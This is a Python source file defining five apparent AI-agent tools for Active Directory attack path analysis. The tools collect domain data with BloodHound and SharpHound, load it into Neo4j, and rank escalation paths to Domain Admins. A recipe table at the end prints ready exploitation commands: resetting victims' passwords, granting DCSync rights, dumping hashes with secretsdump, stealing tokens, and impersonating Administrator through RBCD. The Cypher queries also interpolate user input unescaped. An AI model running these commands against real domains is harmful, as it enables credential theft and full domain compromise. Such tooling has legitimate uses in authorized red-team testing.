"""
BloodHound & AD Attack Path Engine Tools

Provides five agent tools for Active Directory attack path analysis using
BloodHound/SharpHound data ingested into UniVex's Neo4j graph:

  SharpHoundCollectorTool    — Orchestrate SharpHound/BloodHound.py collection
                               from a compromised Windows/Linux host; collect
                               users, groups, sessions, ACLs, trusts, GPOs.
  BloodHoundIngestTool       — Parse SharpHound JSON/ZIP output and write AD
                               objects (ADUser, ADGroup, ADComputer, ADOU,
                               ADGPO, ADDomain, ADTrust) into Neo4j.
  BloodHoundQueryTool        — Execute pre-built and custom Cypher queries:
                               shortest paths, Kerberoast, DCSync, delegation,
                               ACL abuse, GPO abuse, etc.
  ADAttackPathTool           — Analyze ingested AD data and rank attack chains
                               by hop count, exploitability, and impact.
  ADPrivEscRecommenderTool   — Given current compromised context, recommend
                               the optimal privilege escalation path.

MITRE ATT&CK: T1484 (Domain Policy Modification), T1558 (Kerberos),
              T1069 (Permission Groups Discovery), T1087 (Account Discovery),
              T1590 (Gather Victim Network Information)
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
from typing import Any, Dict, List, Optional

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import truncate_output

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Pre-built query database path
# ---------------------------------------------------------------------------

_DATA_DIR = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "../../../data")
)
_QUERIES_PATH = os.path.join(_DATA_DIR, "bloodhound_queries.json")

_QUERIES_CACHE: Optional[List[Dict[str, Any]]] = None


def _load_queries() -> List[Dict[str, Any]]:
    global _QUERIES_CACHE
    if _QUERIES_CACHE is None:
        with open(_QUERIES_PATH, "r", encoding="utf-8") as fh:
            _QUERIES_CACHE = json.load(fh)
    return _QUERIES_CACHE


# ---------------------------------------------------------------------------
# Helper: safe subprocess runner
# ---------------------------------------------------------------------------


async def _run_proc(
    cmd: List[str], timeout: int = 120
) -> tuple[str, str, int]:
    """Run *cmd* and return (stdout, stderr, returncode)."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return stdout.decode(errors="replace"), stderr.decode(errors="replace"), proc.returncode or 0
    except FileNotFoundError:
        raise
    except asyncio.TimeoutError:
        return "", f"Command timed out after {timeout}s", 1
    except Exception as exc:
        return "", str(exc), 1


# ===========================================================================
# 1. SharpHoundCollectorTool
# ===========================================================================


class SharpHoundCollectorTool(BaseTool):
    """
    Orchestrate SharpHound / BloodHound.py data collection from a compromised
    Windows or Linux host.

    On Windows: invokes SharpHound.exe (via a Meterpreter session or direct
    shell) collecting users, groups, sessions, ACLs, trusts, and GPOs.
    On Linux/remote: uses BloodHound.py (impacket-based) for remote collection
    over LDAP/Kerberos.

    Output is a ZIP of JSON files ready for BloodHoundIngestTool.
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="sharphound_collect",
            description=(
                "Run SharpHound/BloodHound.py to collect Active Directory data "
                "(users, groups, sessions, ACLs, trusts, GPOs) from a target domain. "
                "Returns path to the output ZIP/JSON for ingestion."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "method": {
                        "type": "string",
                        "description": (
                            "Collection method: 'bloodhound-py' (Linux/remote via LDAP) "
                            "or 'sharphound' (Windows binary)"
                        ),
                        "enum": ["bloodhound-py", "sharphound"],
                        "default": "bloodhound-py",
                    },
                    "domain": {
                        "type": "string",
                        "description": "Target AD domain name (e.g. corp.local)",
                    },
                    "domain_controller": {
                        "type": "string",
                        "description": "IP/hostname of the domain controller",
                    },
                    "username": {
                        "type": "string",
                        "description": "Domain username for authentication",
                    },
                    "password": {
                        "type": "string",
                        "description": "Password or NTLM hash (LM:NT format for PTH)",
                    },
                    "collection_method": {
                        "type": "string",
                        "description": "BloodHound collection method flags",
                        "default": "All",
                    },
                    "output_dir": {
                        "type": "string",
                        "description": "Directory to write output files",
                        "default": "/tmp/bh_output",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Execution timeout in seconds",
                        "default": 300,
                    },
                },
                "required": ["domain", "domain_controller"],
            },
        )

    async def execute(
        self,
        domain: str,
        domain_controller: str,
        method: str = "bloodhound-py",
        username: str = "",
        password: str = "",
        collection_method: str = "All",
        output_dir: str = "/tmp/bh_output",
        timeout: int = 300,
        **kwargs: Any,
    ) -> str:
        os.makedirs(output_dir, exist_ok=True)

        if method == "bloodhound-py":
            return await self._run_bloodhound_py(
                domain, domain_controller, username, password,
                collection_method, output_dir, timeout
            )
        elif method == "sharphound":
            return await self._run_sharphound(
                domain, domain_controller, collection_method, output_dir, timeout
            )
        else:
            return f"Error: Unknown collection method '{method}'."

    async def _run_bloodhound_py(
        self,
        domain: str,
        dc: str,
        username: str,
        password: str,
        collection: str,
        output_dir: str,
        timeout: int,
    ) -> str:
        cmd = [
            "bloodhound-python",
            "-d", domain,
            "-dc", dc,
            "-c", collection,
            "--zip",
            "-o", output_dir,
        ]
        if username:
            cmd += ["-u", username]
        if password:
            if ":" in password and len(password.split(":")[0]) == 32:
                cmd += ["--hashes", password]
            else:
                cmd += ["-p", password]
        else:
            cmd += ["-k", "--no-pass"]

        try:
            stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'bloodhound-python' not found. "
                "Install with: pip install bloodhound"
            )

        output_files = []
        if os.path.isdir(output_dir):
            output_files = [
                f for f in os.listdir(output_dir)
                if f.endswith(".zip") or f.endswith(".json")
            ]

        result = [
            f"=== BloodHound.py Collection — {domain} ===",
            f"Domain Controller : {dc}",
            f"Collection Method : {collection}",
            f"Return Code       : {rc}",
            f"Output Directory  : {output_dir}",
            f"Files Generated   : {len(output_files)}",
        ]
        if output_files:
            result.append("Output Files:")
            for f in sorted(output_files):
                result.append(f"  {os.path.join(output_dir, f)}")
        if rc != 0 and stderr:
            result.append(f"\n[STDERR]\n{truncate_output(stderr, max_chars=2000)}")
        if stdout:
            result.append(f"\n[STDOUT]\n{truncate_output(stdout, max_chars=3000)}")
        return "\n".join(result)

    async def _run_sharphound(
        self,
        domain: str,
        dc: str,
        collection: str,
        output_dir: str,
        timeout: int,
    ) -> str:
        # SharpHound is a Windows binary; we invoke it via wine or meterpreter
        cmd = [
            "SharpHound.exe",
            "--CollectionMethods", collection,
            "--Domain", domain,
            "--DomainController", dc,
            "--ZipFilename", os.path.join(output_dir, "sharphound_output.zip"),
            "--OutputDirectory", output_dir,
        ]
        try:
            stdout, stderr, rc = await _run_proc(cmd, timeout=timeout)
        except FileNotFoundError:
            return (
                "Error: 'SharpHound.exe' not found. "
                "Deploy SharpHound.exe to target or use method='bloodhound-py'."
            )
        return (
            f"SharpHound collection complete (rc={rc}).\n"
            f"Output: {output_dir}\n"
            f"{truncate_output(stdout + stderr, max_chars=3000)}"
        )


# ===========================================================================
# 2. BloodHoundIngestTool
# ===========================================================================


class BloodHoundIngestTool(BaseTool):
    """
    Parse SharpHound JSON/ZIP output and ingest it into UniVex's Neo4j
    instance as typed AD nodes (ADUser, ADGroup, ADComputer, ADOU, ADGPO,
    ADDomain, ADTrust) with 15+ relationship types.
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="bloodhound_ingest",
            description=(
                "Ingest SharpHound collection output (JSON files or ZIP archive) "
                "into UniVex's Neo4j graph database as AD-specific node types "
                "(ADUser, ADGroup, ADComputer, ADOU, ADGPO, ADDomain, ADTrust) "
                "with full relationship mapping."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "Path to SharpHound ZIP file or directory containing JSON files"
                        ),
                    },
                    "neo4j_uri": {
                        "type": "string",
                        "description": "Neo4j Bolt URI",
                        "default": "bolt://localhost:7687",
                    },
                    "neo4j_user": {
                        "type": "string",
                        "description": "Neo4j username",
                        "default": "neo4j",
                    },
                    "neo4j_password": {
                        "type": "string",
                        "description": "Neo4j password",
                        "default": "neo4j",
                    },
                    "create_schema": {
                        "type": "boolean",
                        "description": "Create indexes and constraints before ingestion",
                        "default": True,
                    },
                },
                "required": ["path"],
            },
        )

    async def execute(
        self,
        path: str,
        neo4j_uri: str = "bolt://localhost:7687",
        neo4j_user: str = "neo4j",
        neo4j_password: str = "neo4j",
        create_schema: bool = True,
        **kwargs: Any,
    ) -> str:
        if not os.path.exists(path):
            return f"Error: Path does not exist: {path}"

        try:
            from app.graph.bloodhound_ingest import BloodHoundIngest, create_ad_schema
            from app.db.neo4j_client import Neo4jClient
        except ImportError as exc:
            return f"Import error: {exc}. Ensure Neo4j client is configured."

        try:
            client = Neo4jClient(uri=neo4j_uri, user=neo4j_user, password=neo4j_password)
        except Exception as exc:
            return f"Neo4j connection failed: {exc}"

        if create_schema:
            try:
                await create_ad_schema(client)
            except Exception as exc:
                logger.warning("Schema creation failed (non-fatal): %s", exc)

        ingest = BloodHoundIngest(client)
        try:
            if path.endswith(".zip"):
                stats = await ingest.ingest_zip(path)
            elif os.path.isdir(path):
                stats = await ingest.ingest_directory(path)
            else:
                stats = await ingest.ingest_file(path)
        except Exception as exc:
            return f"Ingestion error: {exc}"

        result = [
            "=== BloodHound Ingestion Complete ===",
            stats.summary(),
            f"Files processed : {', '.join(stats.files_processed) or 'none'}",
        ]
        if stats.errors:
            result.append(f"\nErrors ({len(stats.errors)}):")
            for err in stats.errors[:10]:
                result.append(f"  • {err}")
            if len(stats.errors) > 10:
                result.append(f"  ... and {len(stats.errors) - 10} more")
        return "\n".join(result)


# ===========================================================================
# 3. BloodHoundQueryTool
# ===========================================================================


class BloodHoundQueryTool(BaseTool):
    """
    Execute pre-built or custom Cypher queries against the ingested AD graph.

    Pre-built queries cover: shortest path to DA, Kerberoastable users,
    AS-REP roastable, DCSync rights, unconstrained delegation, high-value
    targets, GPO abuse, ACL abuse, trust paths, shadow credentials, etc.
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="bloodhound_query",
            description=(
                "Run pre-built or custom Cypher queries against ingested AD graph data. "
                "Pre-built queries include: shortest path to Domain Admin, "
                "Kerberoastable users, AS-REP roastable users, DCSync rights, "
                "unconstrained delegation, GPO abuse paths, and more."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "query_id": {
                        "type": "string",
                        "description": (
                            "Pre-built query ID from bloodhound_queries.json "
                            "(e.g. 'BHQ001'). Use 'list' to see available queries."
                        ),
                    },
                    "custom_cypher": {
                        "type": "string",
                        "description": "Custom Cypher query to execute (overrides query_id)",
                    },
                    "params": {
                        "type": "object",
                        "description": "Query parameters (e.g. {\"domain\": \"CORP.LOCAL\"})",
                        "default": {},
                    },
                    "neo4j_uri": {
                        "type": "string",
                        "description": "Neo4j Bolt URI",
                        "default": "bolt://localhost:7687",
                    },
                    "neo4j_user": {"type": "string", "default": "neo4j"},
                    "neo4j_password": {"type": "string", "default": "neo4j"},
                    "limit": {
                        "type": "integer",
                        "description": "Maximum number of results to return",
                        "default": 50,
                    },
                },
                "required": [],
            },
        )

    async def execute(
        self,
        query_id: str = "",
        custom_cypher: str = "",
        params: Optional[Dict[str, Any]] = None,
        neo4j_uri: str = "bolt://localhost:7687",
        neo4j_user: str = "neo4j",
        neo4j_password: str = "neo4j",
        limit: int = 50,
        **kwargs: Any,
    ) -> str:
        params = params or {}

        # List available queries
        if query_id == "list" or (not query_id and not custom_cypher):
            queries = _load_queries()
            lines = ["=== Available BloodHound Queries ===\n"]
            for q in queries:
                lines.append(
                    f"  [{q['id']}] {q['name']} "
                    f"({q['category']}) — severity: {q['severity']}"
                )
            return "\n".join(lines)

        # Resolve query
        cypher = custom_cypher
        query_meta: Dict[str, Any] = {}
        if not cypher and query_id:
            queries = _load_queries()
            for q in queries:
                if q["id"] == query_id:
                    cypher = q["cypher"]
                    query_meta = q
                    break
            if not cypher:
                return f"Error: Query ID '{query_id}' not found. Use query_id='list' to see available queries."

        # Substitute {domain} placeholders
        if "{domain}" in cypher:
            domain = params.get("domain", "")
            if not domain:
                return "Error: This query requires a 'domain' parameter (e.g. params={\"domain\": \"CORP.LOCAL\"})."
            cypher = cypher.replace("{domain}", domain.upper())

        # Add LIMIT if not present
        if "LIMIT" not in cypher.upper():
            cypher = cypher.rstrip().rstrip(";") + f" LIMIT {limit}"

        try:
            from app.db.neo4j_client import Neo4jClient
            client = Neo4jClient(uri=neo4j_uri, user=neo4j_user, password=neo4j_password)
            results = client.run_query(cypher, params)
        except ImportError as exc:
            return f"Import error: {exc}"
        except Exception as exc:
            return f"Neo4j query failed: {exc}"

        result = []
        if query_meta:
            result += [
                f"=== {query_meta.get('name', 'BloodHound Query')} ===",
                f"ID          : {query_meta.get('id', '')}",
                f"Category    : {query_meta.get('category', '')}",
                f"Severity    : {query_meta.get('severity', '')}",
                f"Description : {query_meta.get('description', '')}",
                "",
            ]
        else:
            result.append("=== Custom Cypher Query ===\n")

        result.append(f"Cypher: {cypher}\n")
        result.append(f"Results ({len(results)} rows):")
        if not results:
            result.append("  (no results)")
        else:
            for i, row in enumerate(results[:limit], 1):
                result.append(f"  [{i:03d}] {json.dumps(row, default=str)}")
        return "\n".join(result)


# ===========================================================================
# 4. ADAttackPathTool
# ===========================================================================


class ADAttackPathTool(BaseTool):
    """
    Analyze ingested AD graph data and suggest prioritized attack chains.

    Ranks attack paths by: hop count (fewer = better), exploitability
    (known technique vs. complex privilege abuse), and blast radius/impact
    (reaching DA/EA vs. lateral movement only).
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ad_attack_path",
            description=(
                "Analyze ingested AD data and generate prioritized attack chains "
                "from current access to Domain Admin. Ranks paths by hop count, "
                "exploitability, and impact. Requires BloodHound data ingested into Neo4j."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "domain": {
                        "type": "string",
                        "description": "Target AD domain name (e.g. CORP.LOCAL)",
                    },
                    "owned_principals": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "List of currently compromised usernames/SIDs",
                        "default": [],
                    },
                    "target": {
                        "type": "string",
                        "description": "Target group or user (default: Domain Admins)",
                        "default": "DOMAIN ADMINS",
                    },
                    "max_hops": {
                        "type": "integer",
                        "description": "Maximum path length in hops",
                        "default": 10,
                    },
                    "neo4j_uri": {"type": "string", "default": "bolt://localhost:7687"},
                    "neo4j_user": {"type": "string", "default": "neo4j"},
                    "neo4j_password": {"type": "string", "default": "neo4j"},
                },
                "required": ["domain"],
            },
        )

    async def execute(
        self,
        domain: str,
        owned_principals: Optional[List[str]] = None,
        target: str = "DOMAIN ADMINS",
        max_hops: int = 10,
        neo4j_uri: str = "bolt://localhost:7687",
        neo4j_user: str = "neo4j",
        neo4j_password: str = "neo4j",
        **kwargs: Any,
    ) -> str:
        owned_principals = owned_principals or []
        domain_upper = domain.upper()
        target_name = f"{target.upper()}@{domain_upper}"

        # Mark owned principals
        mark_cypher = (
            "UNWIND $principals AS name "
            "MATCH (n {name: name}) SET n.owned = true RETURN count(n) AS marked"
        )
        # Path query
        if owned_principals:
            path_cypher = (
                f"MATCH (n {{owned: true}}), "
                f"(target:ADGroup {{name: '{target_name}'}}), "
                f"p = shortestPath((n)-[*1..{max_hops}]->(target)) "
                f"WHERE n <> target "
                f"RETURN p, length(p) AS hops, [r IN relationships(p) | type(r)] AS rel_types, "
                f"[x IN nodes(p) | x.name] AS node_names "
                f"ORDER BY hops LIMIT 20"
            )
        else:
            path_cypher = (
                f"MATCH (n), (target:ADGroup {{name: '{target_name}'}}), "
                f"p = shortestPath((n)-[*1..{max_hops}]->(target)) "
                f"WHERE n <> target AND n.highvalue IS NULL "
                f"RETURN p, length(p) AS hops, [r IN relationships(p) | type(r)] AS rel_types, "
                f"[x IN nodes(p) | x.name] AS node_names "
                f"ORDER BY hops LIMIT 20"
            )

        try:
            from app.db.neo4j_client import Neo4jClient
            client = Neo4jClient(uri=neo4j_uri, user=neo4j_user, password=neo4j_password)

            if owned_principals:
                client.run_query(mark_cypher, {"principals": owned_principals})

            paths = client.run_query(path_cypher, {})
        except ImportError as exc:
            return f"Import error: {exc}"
        except Exception as exc:
            return f"Neo4j query failed: {exc}"

        lines = [
            f"=== AD Attack Path Analysis — {domain_upper} ===",
            f"Target     : {target_name}",
            f"Max Hops   : {max_hops}",
            f"Owned      : {', '.join(owned_principals) or '(all nodes)'}",
            f"Paths Found: {len(paths)}",
            "",
        ]

        if not paths:
            lines.append(
                "No attack paths found. Either AD data has not been ingested, "
                "the domain name is incorrect, or no paths exist within the hop limit."
            )
            return "\n".join(lines)

        for i, row in enumerate(paths, 1):
            hops = row.get("hops", "?")
            node_names = row.get("node_names", [])
            rel_types = row.get("rel_types", [])
            # Build readable path string
            path_str = ""
            for j, node in enumerate(node_names):
                path_str += str(node)
                if j < len(rel_types):
                    path_str += f" —[{rel_types[j]}]→ "

            # Score exploitability
            high_value_rels = {"GenericAll", "WriteDACL", "WriteOwner", "DCSync", "ForceChangePassword"}
            easy_rels = {"MemberOf", "AdminTo", "HasSession", "CanRDP"}
            score = 10 - int(hops)
            exploitable_count = sum(1 for r in rel_types if r in high_value_rels | easy_rels)
            score += exploitable_count

            lines.append(
                f"Path {i:02d} | Hops: {hops} | Score: {score}/15"
            )
            lines.append(f"  {path_str}")
            lines.append(f"  Relationships: {' → '.join(rel_types)}")
            lines.append("")

        lines.append("\n[Scoring] Higher score = easier/higher-impact path.")
        lines.append("[Next Step] Use ADPrivEscRecommenderTool for step-by-step exploitation guidance.")
        return "\n".join(lines)


# ===========================================================================
# 5. ADPrivEscRecommenderTool
# ===========================================================================

# Exploitation recipes keyed by relationship type
_PRIVESC_RECIPES: Dict[str, Dict[str, str]] = {
    "GenericAll": {
        "technique": "Full control — reset password, add to groups, or write SPN",
        "commands": (
            "# Reset victim's password:\n"
            "net rpc password <victim> <newpass> -U <domain>/<you>%<pass> -S <dc>\n"
            "# Or via PowerView:\n"
            "Set-DomainUserPassword -Identity <victim> -AccountPassword (ConvertTo-SecureString '<newpass>' -AsPlainText -Force)"
        ),
        "mitre": "T1098",
    },
    "GenericWrite": {
        "technique": "Write arbitrary attributes — set SPN (Kerberoast) or msDS-KeyCredentialLink (Shadow Creds)",
        "commands": (
            "# Set SPN for Kerberoast:\n"
            "Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='fake/spn'}\n"
            "# Then: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request"
        ),
        "mitre": "T1558.003",
    },
    "WriteDACL": {
        "technique": "Modify DACL — grant yourself GenericAll or DCSync rights",
        "commands": (
            "# Grant DCSync rights:\n"
            "Add-DomainObjectAcl -TargetIdentity <domain> -PrincipalIdentity <you> -Rights DCSync\n"
            "# Then run: secretsdump.py <domain>/<you>@<dc>"
        ),
        "mitre": "T1484.001",
    },
    "WriteOwner": {
        "technique": "Change object owner, then modify DACL to grant full control",
        "commands": (
            "Set-DomainObjectOwner -Identity <target> -OwnerIdentity <you>\n"
            "Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <you> -Rights All"
        ),
        "mitre": "T1484.001",
    },
    "ForceChangePassword": {
        "technique": "Force-change victim's password without knowing the current one",
        "commands": (
            "$pass = ConvertTo-SecureString '<newpass>' -AsPlainText -Force\n"
            "Set-DomainUserPassword -Identity <victim> -AccountPassword $pass"
        ),
        "mitre": "T1098",
    },
    "AdminTo": {
        "technique": "Local admin — dump LSASS, pass-the-hash, or execute commands",
        "commands": (
            "# Dump hashes:\n"
            "secretsdump.py <domain>/<user>@<target_computer>\n"
            "# PSExec:\n"
            "psexec.py <domain>/<user>@<target_computer>"
        ),
        "mitre": "T1003.001",
    },
    "HasSession": {
        "technique": "User has active session — steal tokens or inject into process",
        "commands": (
            "# Impersonate via Meterpreter:\n"
            "steal_token <PID>\n"
            "# Or use Invoke-TokenManipulation"
        ),
        "mitre": "T1134",
    },
    "CanRDP": {
        "technique": "RDP access — log in and escalate locally",
        "commands": "xfreerdp /v:<target> /u:<domain>\\<user> /p:<pass> /cert-ignore",
        "mitre": "T1021.001",
    },
    "CanPSRemote": {
        "technique": "PowerShell Remoting access",
        "commands": "evil-winrm -i <target> -u <user> -p <pass>",
        "mitre": "T1021.006",
    },
    "DCSync": {
        "technique": "DCSync — replicate AD password data from DC",
        "commands": "secretsdump.py -just-dc <domain>/<user>@<dc_ip>",
        "mitre": "T1003.006",
    },
    "MemberOf": {
        "technique": "Nested group membership grants access to target resources",
        "commands": "# No direct exploitation — leverage inherited permissions of the group",
        "mitre": "T1069.002",
    },
    "AllExtendedRights": {
        "technique": "Extended rights — includes GetChanges/GetChangesAll (DCSync) and user-force-change-password",
        "commands": "secretsdump.py -just-dc <domain>/<user>@<dc_ip>",
        "mitre": "T1003.006",
    },
    "AddKeyCredentialLink": {
        "technique": "Shadow Credentials — add key credential, request TGT as victim",
        "commands": (
            "pywhisker.py -d <domain> -u <you> -p <pass> --target <victim> --action add\n"
            "# Then use the PFX to get TGT"
        ),
        "mitre": "T1556",
    },
    "AllowedToAct": {
        "technique": "Resource-Based Constrained Delegation (RBCD) — impersonate any user to target service",
        "commands": (
            "# Set msDS-AllowedToActOnBehalfOfOtherIdentity:\n"
            "rbcd.py -dc-ip <dc> -action write -delegate-to <target>$ -delegate-from <controlled>$ <domain>/<user>:<pass>\n"
            "# Then: getST.py -spn cifs/<target> -impersonate Administrator <domain>/<controlled>$"
        ),
        "mitre": "T1558.001",
    },
}


class ADPrivEscRecommenderTool(BaseTool):
    """
    Given current AD context (compromised user/computer), recommend the
    optimal privilege escalation path from available attack paths in Neo4j,
    with step-by-step exploitation commands for each relationship type.
    """

    def __init__(self) -> None:
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ad_privesc_recommend",
            description=(
                "Analyze AD graph and recommend the optimal privilege escalation path "
                "from a compromised principal to Domain Admin. Provides step-by-step "
                "exploitation commands for each edge type in the attack path."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "compromised_user": {
                        "type": "string",
                        "description": "Currently compromised username (SAMAccountName or UPN)",
                    },
                    "domain": {
                        "type": "string",
                        "description": "AD domain name (e.g. CORP.LOCAL)",
                    },
                    "domain_controller": {
                        "type": "string",
                        "description": "Domain controller IP/hostname",
                        "default": "",
                    },
                    "max_hops": {
                        "type": "integer",
                        "description": "Maximum path hops to consider",
                        "default": 8,
                    },
                    "neo4j_uri": {"type": "string", "default": "bolt://localhost:7687"},
                    "neo4j_user": {"type": "string", "default": "neo4j"},
                    "neo4j_password": {"type": "string", "default": "neo4j"},
                },
                "required": ["compromised_user", "domain"],
            },
        )

    async def execute(
        self,
        compromised_user: str,
        domain: str,
        domain_controller: str = "",
        max_hops: int = 8,
        neo4j_uri: str = "bolt://localhost:7687",
        neo4j_user: str = "neo4j",
        neo4j_password: str = "neo4j",
        **kwargs: Any,
    ) -> str:
        domain_upper = domain.upper()
        user_upper = compromised_user.upper()
        da_group = f"DOMAIN ADMINS@{domain_upper}"

        path_cypher = (
            f"MATCH (start:ADUser {{name: '{user_upper}@{domain_upper}'}}), "
            f"(target:ADGroup {{name: '{da_group}'}}), "
            f"p = shortestPath((start)-[*1..{max_hops}]->(target)) "
            f"RETURN p, length(p) AS hops, "
            f"[r IN relationships(p) | type(r)] AS rel_types, "
            f"[x IN nodes(p) | x.name] AS node_names, "
            f"[x IN nodes(p) | labels(x)[0]] AS node_labels "
            f"ORDER BY hops LIMIT 5"
        )

        # Also check quick wins
        quick_win_cypher = (
            f"MATCH (start:ADUser {{name: '{user_upper}@{domain_upper}'}})-"
            f"[r:DCSync|GenericAll|WriteDACL|AllExtendedRights]->(n) "
            f"RETURN type(r) AS rel, n.name AS target_node, labels(n) AS node_type LIMIT 10"
        )

        try:
            from app.db.neo4j_client import Neo4jClient
            client = Neo4jClient(uri=neo4j_uri, user=neo4j_user, password=neo4j_password)
            paths = client.run_query(path_cypher, {})
            quick_wins = client.run_query(quick_win_cypher, {})
        except ImportError as exc:
            return f"Import error: {exc}"
        except Exception as exc:
            return f"Neo4j query failed: {exc}"

        lines = [
            "╔══════════════════════════════════════════════════════════╗",
            "║     AD Privilege Escalation Recommendation Report        ║",
            "╚══════════════════════════════════════════════════════════╝",
            "",
            f"Compromised Principal : {compromised_user}@{domain_upper}",
            f"Target                : {da_group}",
            f"DC                    : {domain_controller or 'not specified'}",
            "",
        ]

        # Quick wins first
        if quick_wins:
            lines.append("⚡ QUICK WINS (Direct Privilege Paths):")
            lines.append("-" * 50)
            for qw in quick_wins:
                rel = qw.get("rel", "")
                tgt = qw.get("target_node", "")
                recipe = _PRIVESC_RECIPES.get(rel, {})
                lines.append(f"\n  Edge: {compromised_user} —[{rel}]→ {tgt}")
                if recipe:
                    lines.append(f"  Technique : {recipe.get('technique', '')}")
                    lines.append(f"  MITRE     : {recipe.get('mitre', '')}")
                    cmd_lines = recipe.get("commands", "").split("\n")
                    lines.append("  Commands  :")
                    for cmd_line in cmd_lines:
                        lines.append(f"    {cmd_line}")
            lines.append("")

        # Full attack paths
        if not paths:
            lines.append(
                "⚠  No attack paths found in graph. Ensure BloodHound data has been "
                "ingested and the username format matches (SAMAccountName@DOMAIN.LOCAL)."
            )
        else:
            lines.append(f"🗺  Attack Paths to {da_group}:")
            lines.append("=" * 60)

            for i, row in enumerate(paths, 1):
                hops = row.get("hops", "?")
                node_names = row.get("node_names", [])
                rel_types = row.get("rel_types", [])
                node_labels = row.get("node_labels", [])

                lines.append(f"\n── Path {i} ({hops} hops) ──")

                for step_idx, rel in enumerate(rel_types):
                    src = node_names[step_idx] if step_idx < len(node_names) else "?"
                    dst = node_names[step_idx + 1] if step_idx + 1 < len(node_names) else "?"
                    src_label = node_labels[step_idx] if step_idx < len(node_labels) else ""
                    dst_label = node_labels[step_idx + 1] if step_idx + 1 < len(node_labels) else ""

                    lines.append(
                        f"\n  Step {step_idx + 1}: [{src_label}] {src} —[{rel}]→ [{dst_label}] {dst}"
                    )

                    recipe = _PRIVESC_RECIPES.get(rel)
                    if recipe:
                        lines.append(f"    ▶ Technique : {recipe['technique']}")
                        lines.append(f"    ▶ MITRE     : {recipe['mitre']}")
                        for cmd_line in recipe["commands"].split("\n"):
                            if cmd_line.startswith("#"):
                                lines.append(f"      {cmd_line}")
                            else:
                                lines.append(f"      $ {cmd_line}")
                    else:
                        lines.append(
                            f"    ▶ Technique : Leverage {rel} edge "
                            f"(consult BloodHound documentation)"
                        )

        lines.append(
            "\n\n[Reference] BloodHound CE: https://github.com/SpecterOps/BloodHound"
        )
        return "\n".join(lines)
